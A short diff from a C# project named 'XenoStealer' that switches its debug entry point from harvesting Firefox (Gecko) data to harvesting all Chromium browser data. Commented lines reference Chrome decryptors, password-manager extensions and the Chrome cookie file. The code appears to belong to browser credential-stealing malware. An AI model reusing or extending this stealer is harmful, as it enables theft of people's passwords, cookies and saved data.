@@ -20,10 +20,10 @@ namespace XenoStealer
 
             //ChromeDecryptor a = new ChromeDecryptor(@"C:\Users\moom825\AppData\Local\Google\Chrome\User Data");
             //
-            //var t=Chromium.GetAutoFills(@"C:\Users\moom825\AppData\Local\Google\Chrome\User Data\Default");
+            //var t=Chromium.GetPasswordManagerExtensions(@"C:\Users\moom825\AppData\Local\Google\Chrome\User Data\Default");
 
             //GeckoDecryptor a = new GeckoDecryptor(Configuration.GeckoLibraryPaths["Firefox"]);
-            var t=Gecko.GetAllInfo(DataExtractionStructs.GeckoBrowserOptions.All);
+            var t=Chromium.GetAllInfo(DataExtractionStructs.ChromiumBrowserOptions.All);
             var y = 0;
             //Utils.GetProcessLockingFile(@"C:\Users\moom825\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies", out var asd);
 
